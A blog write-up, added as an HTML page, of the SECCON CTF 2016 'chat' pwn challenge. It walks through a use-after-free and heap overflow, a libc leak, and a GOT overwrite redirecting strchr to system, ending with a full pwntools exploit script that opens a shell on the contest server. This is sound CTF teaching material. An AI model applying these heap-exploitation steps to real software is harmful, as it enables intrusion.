@@ -1,0 +1,862 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>SECCON CTF 2016 – chat - Hacking Tube 2.0</title>
+<meta name="description" content="Category: ExploitPoints: 500">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:title" content="SECCON CTF 2016 – chat">
+<meta property="og:url" content="http://0.0.0.0:4000/seccon-ctf-2016-chat/">
+
+
+  <meta property="og:description" content="Category: ExploitPoints: 500">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2016-12-12T16:03:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/seccon-ctf-2016-chat/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Hacking Tube 2.0</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/archives/" >Archive</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Vulnerability researcher / CTFer
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="SECCON CTF 2016 – chat">
+    <meta itemprop="description" content="Category: ExploitPoints: 500">
+    <meta itemprop="datePublished" content="December 12, 2016">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">SECCON CTF 2016 – chat
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><strong>Category:</strong> Exploit
+<strong>Points:</strong> 500</p>
+
+<!-- more -->
+
+<p>64 bit ELF with Partial RELRO, stack canary &amp; NX enabled, No PIE.</p>
+
+<p>The program is a simple tweet-chat service:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./chat
+Simple Chat Service
+
+1 : Sign Up     2 : Sign In
+0 : Exit
+menu &gt; 1
+name &gt; userA
+Success!
+
+1 : Sign Up     2 : Sign In
+0 : Exit
+menu &gt; 1
+name &gt; userB
+Success!
+
+1 : Sign Up     2 : Sign In
+0 : Exit
+menu &gt; 2
+name &gt; userA
+Hello, userA!
+Success!
+
+Service Menu
+
+1 : Show TimeLine       2 : Show DM     3 : Show UsersList
+4 : Send PublicMessage  5 : Send DirectMessage
+6 : Remove PublicMessage                7 : Change UserName
+0 : Sign Out
+menu &gt;&gt; 5
+name &gt;&gt; userB
+message &gt;&gt; from a
+Done.
+</code></pre></div></div>
+
+<p>As we can see the service allow us to sign up users, sign in and tweet message (send public message). We can also DM other users. In the above example, after <code class="highlighter-rouge">userA</code> send a message to <code class="highlighter-rouge">userB</code>, we can sign in as <code class="highlighter-rouge">userB</code> and check the DM:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1 : Sign Up     2 : Sign In
+0 : Exit
+menu &gt; 2
+name &gt; userB
+Hello, userB!
+Success!
+
+Service Menu
+
+1 : Show TimeLine       2 : Show DM     3 : Show UsersList
+4 : Send PublicMessage  5 : Send DirectMessage
+6 : Remove PublicMessage                7 : Change UserName
+0 : Sign Out
+menu &gt;&gt; 2
+Direct Messages
+[userA] from a
+Done.
+</code></pre></div></div>
+<p>It will print the sender’s name and its message.</p>
+
+<p>Users and messages are stored in the program with two different kinds of data structures:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">user</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">message</span> <span class="o">*</span><span class="n">msg</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">user</span> <span class="o">*</span><span class="n">next_user</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">struct</span> <span class="n">message</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">id</span> <span class="p">;</span> <span class="c1">// use in tweet (public message) only
+</span>    <span class="k">struct</span> <span class="n">user</span> <span class="o">*</span><span class="n">sender</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">content</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+    <span class="k">struct</span> <span class="n">message</span> <span class="o">*</span><span class="n">next_msg</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Notice that there’s some limitations while setting <code class="highlighter-rouge">user-&gt;name</code>: the maximum name length is 32, and <strong>the first character must be a printable character</strong> (check by the <a href="http://www.cplusplus.com/reference/cctype/isprint/">isprint</a> function). This effects the functionality of the <code class="highlighter-rouge">Change UserName</code> : If you change a user’s name, and the new name isn’t a valid user name, <strong>it will remove the user</strong>.</p>
+
+<p>So what if we remove a user after we send a DM to another user?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1 : Sign Up     2 : Sign In
+0 : Exit
+menu &gt; 2
+name &gt; userA
+Hello, userA!
+Success!
+
+Service Menu
+
+1 : Show TimeLine       2 : Show DM     3 : Show UsersList
+4 : Send PublicMessage  5 : Send DirectMessage
+6 : Remove PublicMessage                7 : Change UserName
+0 : Sign Out
+menu &gt;&gt; 7
+name &gt;&gt;            &lt;-- here we input '\t', which did not pass the isprint check
+Change name error...
+Bye, 
+
+1 : Sign Up     2 : Sign In
+0 : Exit
+menu &gt; 2
+name &gt; userB
+Hello, userB!
+Success!
+
+Service Menu
+
+1 : Show TimeLine       2 : Show DM     3 : Show UsersList
+4 : Send PublicMessage  5 : Send DirectMessage
+6 : Remove PublicMessage                7 : Change UserName
+0 : Sign Out
+menu &gt;&gt; 2
+Direct Messages
+[] from a       &lt;-- strange sender's name
+Done.
+</code></pre></div></div>
+
+<p>We can see that if we show <code class="highlighter-rouge">userB</code>’s DM after we remove <code class="highlighter-rouge">userA</code>, the sender’s name will become a strange value. This is because while removing <code class="highlighter-rouge">userA</code>, it will free the <code class="highlighter-rouge">userA-&gt;name</code> pointer, but the program is still able to access the pointer by showing <code class="highlighter-rouge">userB</code>’s DM <strong>( accessing <code class="highlighter-rouge">userB-&gt;messsage-&gt;sender-&gt;name</code> )</strong>. A typical Use-After-Free vulnerability.</p>
+
+<p>So now there’s a dangling pointer in the program. If we can arrange the heap memory chunk carefully, and make a user’s name buffer overlapped with <code class="highlighter-rouge">userB-&gt;messsage-&gt;sender</code>:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+                       +--------------+
+userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name
+                       |              |
+                       +----+---------+
+                            |
+            +---------------+
+            |
+            |          +-----------+
+            +-&gt; p_name |sender_name|
+                       |    .      |
+                       |    .      |
+                       |    .      |
+                       +-----------+
+
+</code></pre></div></div>
+<p>We can then modify the value of pointer <code class="highlighter-rouge">p_name</code> by editing <code class="highlighter-rouge">userC-&gt;name</code>, and then leak some address by viewing <code class="highlighter-rouge">userB</code>’s DM ( sender’s name ). This can be done easily if you’re familiar with the glibc malloc’s fastbin allocation. By changing <code class="highlighter-rouge">p_name</code> into <code class="highlighter-rouge">__libc_start_main@got.plt</code> ( <code class="highlighter-rouge">0x603040</code>, which its first character is <code class="highlighter-rouge">0x40</code>, a printable character ), we can then leak the libc’s base address.</p>
+
+<p>Now we still need to find a way to do the “write-anywhere” attack. It’s kind of hard to find such vulnerability by just reversing the binary, so I decided to start fuzzing the binary, while examine the heap memory at the same time. Finally ( and luckily ! ), I notice that I’ve made the heap memory chunk arranged like this:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+          +--------------+
+0x1234050 |              | userC-&gt;name
+          +--------------+
+          |              |
+          +--------------+
+0x1234060 |              | unsortbin &lt;-- oh yeah
+          +--------------+
+0x1234068 |          0x21|
+          +--------------+
+          |     .        |
+          |     .        |
+          |     .        |
+          |     .        |
+          |     .        |
+0x1234090 |     0x1234050| userC
+          |              |
+          |              |
+          |              |
+          +--------------+
+
+</code></pre></div></div>
+
+<p>I found that I can corrupt the header of unsortbin chunk <code class="highlighter-rouge">0x1234060</code> by overflowing the <code class="highlighter-rouge">userC-&gt;name</code> buffer ! Later I realized that this is because program use <code class="highlighter-rouge">strdup</code> to allocate the buffer of <code class="highlighter-rouge">userC-&gt;name</code>. If we set the name length of <code class="highlighter-rouge">userC</code> less than 24, it will allocate a buffer with size <code class="highlighter-rouge">0x20</code> ( fastbin[0] ) . But when we change a user’s name, it allow us to input at most 32 characters, which will overflow the name buffer !</p>
+
+<p>By corrupting the meta data and change the chunk size from <code class="highlighter-rouge">0x21</code> to <code class="highlighter-rouge">0xa1</code> ( the size of a <code class="highlighter-rouge">message</code> structure ), we can allocate a fake chunk (<code class="highlighter-rouge">0x1234060</code>, size = <code class="highlighter-rouge">0xa1</code>), and forge the data structure at <code class="highlighter-rouge">0x1234090</code> ( a <code class="highlighter-rouge">user</code> structure ), change the <code class="highlighter-rouge">userC-&gt;name</code> pointer from <code class="highlighter-rouge">0x1234050</code> into another memory address, then we can do the “write-anywhere” attack ( ex. GOT hijacking ) by changing <code class="highlighter-rouge">userC</code>’s name .</p>
+
+<p>So to sum up:</p>
+<ol>
+  <li>Overflow <code class="highlighter-rouge">userC-&gt;name</code>, change the unsortbin chunk size into <code class="highlighter-rouge">0xa1</code>.</li>
+  <li>Post a tweet, this will allocate the memory from unsortbin.</li>
+  <li>Craft the tweet message, forge a fake <code class="highlighter-rouge">user</code> structure (modify the <code class="highlighter-rouge">userC-&gt;name</code> pointer).</li>
+  <li>Change the name of <code class="highlighter-rouge">userC</code> to overwrite the memory.</li>
+</ol>
+
+<p>Looks simple huh? Except it’s <strong>not</strong>. To successfully change a user name, <strong>both the old user name and the new user name’s first character has to be printable</strong>. For example, if we want to hijack <code class="highlighter-rouge">free</code>’s GOT:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ tel 0x603010
+00:0000|  0x603010 --&gt; 0x7eff900f44a0 (&lt;_dl_runtime_resolve&gt;:   sub    rsp,0x38)
+01:0008|  0x603018 --&gt; 0x7eff8fd9bd00 (&lt;__GI___libc_free&gt;:      mov    rax,QWORD PTR [rip+0x33b1e1]        # 0x7eff900d6ee8)
+02:0016|  0x603020 --&gt; 0x7eff8fda19b0 (&lt;strlen&gt;:        pxor   xmm8,xmm8)
+03:0024|  0x603028 --&gt; 0x4007f6 (&lt;__stack_chk_fail@plt+6&gt;:      push   0x2)
+04:0032|  0x603030 --&gt; 0x7eff8fd8b100 (&lt;setbuf&gt;:        mov    edx,0x2000)
+05:0040|  0x603038 --&gt; 0x7eff8fd9fd40 (&lt;__strchr_sse2&gt;: movd   xmm1,esi)
+06:0048|  0x603040 --&gt; 0x7eff8fd3ae50 (&lt;__libc_start_main&gt;:     push   r14)
+07:0056|  0x603048 --&gt; 0x7eff8fd87160 (&lt;_IO_fgets&gt;:     push   r12)
+</code></pre></div></div>
+<p>We can see that <code class="highlighter-rouge">free</code>’s GOT ( <code class="highlighter-rouge">0x603018</code> ) stores the address <code class="highlighter-rouge">0x7eff8fd9bd00</code>. Its first character is <code class="highlighter-rouge">0x00</code>, which is not printable, making us unable to change the content of <code class="highlighter-rouge">0x603018</code>. Even if its first character is printable, the <code class="highlighter-rouge">system</code>’s offset in the libc is <code class="highlighter-rouge">0x46590</code> – another non-printable first character, which will make the program remove (freeing) the user name and crash the program ( for trying to free a GOT entry ).</p>
+
+<p>So how are we gonna bypass the check? Well it’s a little bit tricky, but also very interesting. I notice that the GOT entry of <code class="highlighter-rouge">stack_chk_fail</code> stores the address <code class="highlighter-rouge">0x4007f6</code>. Although <code class="highlighter-rouge">0xf6</code> is non-printable, the third character <code class="highlighter-rouge">0x40</code> is a printable character. Hmmmm, if only I can make <code class="highlighter-rouge">0x40</code> to our user name’s first character…</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ tel 0x60302a
+00:0000|  0x60302a --&gt; 0xb100000000000040   &lt;-- printable first character !
+01:0008|  0x603032 --&gt; 0xfd4000007eff8fd8 
+02:0016|  0x60303a --&gt; 0xae5000007eff8fd9 
+03:0024|  0x603042 --&gt; 0x716000007eff8fd3 
+04:0032|  0x60304a --&gt; 0x8e0000007eff8fd8 
+05:0040|  0x603052 --&gt; 0xd2b000007eff8fe5 
+06:0048|  0x60305a --&gt; 0x86600007eff8fd6 
+07:0056|  0x603062 --&gt; 0x8e80000000000040
+</code></pre></div></div>
+
+<p>That’s right ! If we change the <code class="highlighter-rouge">userC-&gt;name</code> pointer into <code class="highlighter-rouge">0x60302a</code>, we can start overwriting the content from <code class="highlighter-rouge">0x60302a</code>. We first filled the GOT entry of <code class="highlighter-rouge">stack_chk_fail</code> with some printable characters ( now the first character of new user name is printable ! ), then we can start hijack some GOT !</p>
+
+<p>Here I decided to hijack <code class="highlighter-rouge">strchr</code>’s GOT so when the program call <code class="highlighter-rouge">strchr(buf, 10)</code> ( <code class="highlighter-rouge">buf</code> stores our input ) it will call <code class="highlighter-rouge">system(buf)</code> instead.<br />
+```python exp_chat.py
+#!/usr/bin/env python</p>
+
+<p>from pwn import *
+import subprocess
+import sys
+import time</p>
+
+<p>HOST = “chat.pwn.seccon.jp”
+PORT = 26895
+ELF_PATH = “./chat”
+LIBC_PATH = “/lib/x86_64-linux-gnu/libc.so.6” # ubuntu 14.04 64bit</p>
+
+<h1 id="setting">setting</h1>
+<p>context.arch = ‘amd64’
+context.os = ‘linux’
+context.endian = ‘little’
+context.word_size = 32</p>
+<h1 id="critical-debug-error-info-notset-warn-warning">[‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]</h1>
+<p>context.log_level = ‘INFO’</p>
+
+<p>elf = ELF(ELF_PATH)
+libc = ELF(LIBC_PATH)</p>
+
+<p>def my_recvuntil(s, delim):
+    res = “”
+    while delim not in res:
+        c = s.recv(1)
+        res += c
+        sys.stdout.write(c)
+        sys.stdout.flush()
+    return res</p>
+
+<p>def myexec(cmd):
+    return subprocess.check_output(cmd, shell=True)</p>
+
+<p>def signup(name):
+    r.sendlineafter(“&gt; “, “1”)
+    r.sendlineafter(“&gt; “, name)</p>
+
+<p>def signin(name):
+    r.sendlineafter(“&gt; “, “2”)
+    r.sendlineafter(“&gt; “, name)</p>
+
+<p>def tweet(msg):
+    r.sendlineafter(“» “, “4”)
+    r.sendlineafter(“» “, msg)</p>
+
+<p>def dm(user, msg):
+    r.sendlineafter(“» “, “5”)
+    r.sendlineafter(“» “, user)
+    r.sendlineafter(“» “, msg)</p>
+
+<p>def signout():
+    r.sendlineafter(“» “, “0”)</p>
+
+<p>def change_name(name):
+    r.sendlineafter(“» “, “7”)
+    r.sendlineafter(“» “, name)</p>
+
+<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = remote(HOST, PORT)
+#r = process(ELF_PATH)
+
+signup("A"*4) # fastbin[0] * 2
+signup("B"*4) # fastbin[0] * 2
+signup("C"*30) # fastbin[0] * 1 + fastbin[1] * 1 
+
+signin("A"*4)
+tweet("aaaa") 
+signout()
+
+signin("B"*4)
+tweet("bbbb")
+dm("A"*4, "BA") # for creating dangling pointer
+dm("C"*30, "BC")
+signout()
+
+signin("C"*30)
+tweet("cccc")
+signout()
+
+signin("B"*4)
+change_name("\t") # invalid, will remove user (user AAAA's DM become dangling pointer)
+signin("C"*30)
+change_name("\t") 
+
+signup("d"*7)
+signin("d"*7)
+for i in xrange(6,2,-1): # null out the address
+    change_name("d"*i)
+
+malusr = p64(elf.got['__libc_start_main'])
+change_name(malusr) # AAAA's DM's sender-&gt;name will pointer to __libc_start_main@got.plt
+signout()
+
+# leak libc
+signin("A"*4)
+r.sendlineafter("&gt;&gt; ", "2") # show DM, leak libc
+r.recvuntil("[")
+libc.address += u64(r.recv(6).ljust(8,"\x00")) - libc.symbols['__libc_start_main']
+system_addr = libc.symbols['system']
+
+log.success("libc base: "+hex(libc.address))
+log.success("system: "+hex(system_addr))
+signout()
+
+# somehow we can overwrite an unsortbin chunk's size
+# enlarge the size, so we can overflow the heap buffer and fake some data structure
+signin(malusr)
+change_name("i"*24+p8(0xa1))
+tweet("fuck") # will allocate chunk from smallbin
+change_name(p8(0x40)) # make this user into right index
+tweet("7"*16+p64(0x60302a)) # allocate chunk from unsortbin, overwrite data structure. We can now start overwriting memory from 0x60302a
+
+# start overwriting, we wish to overwrite strchr's got
+change_name("A"*6+"B"*8+p64(system_addr)) # padding + padding + strchr's got (overwrite to system)
+r.sendlineafter("&gt;&gt; ", "sh\x00") # strchr("sh", 10) --&gt; system("sh")
+
+r.interactive()
+</code></pre></div></div>
+
+<p>```</p>
+
+<p>First time solving a 500 points pwn challenge ! WOOHOO !</p>
+
+<p>flag: <code class="highlighter-rouge">SECCON{51mpl3_ch47_l1k3_7w1*73*}</code></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#heap" class="page__taxonomy-item" rel="tag">heap</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#heap-overflow" class="page__taxonomy-item" rel="tag">heap_overflow</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#seccon" class="page__taxonomy-item" rel="tag">SECCON</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#use-after-free" class="page__taxonomy-item" rel="tag">use_after_free</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2016-12-12T16:03:00+08:00">December 12, 2016</time></p>
+        
+      </footer>
+
+      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
+<!-- Remove linkdin shared button -->
+<section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=SECCON+CTF+2016+--+chat%20http%3A%2F%2F0.0.0.0%3A4000%2Fseccon-ctf-2016-chat%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fseccon-ctf-2016-chat%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2Fseccon-ctf-2016-chat%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/seccon-ctf-2016-checker/" class="pagination--pager" title="SECCON CTF 2016 – checker
+">Previous</a>
+    
+    
+      <a href="/1255893/" class="pagination--pager" title="33C3 CTF 2016 – pdfmaker
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/seccon-ctf-2016-chat/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/seccon-ctf-2016-chat"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+  </body>
+</html>
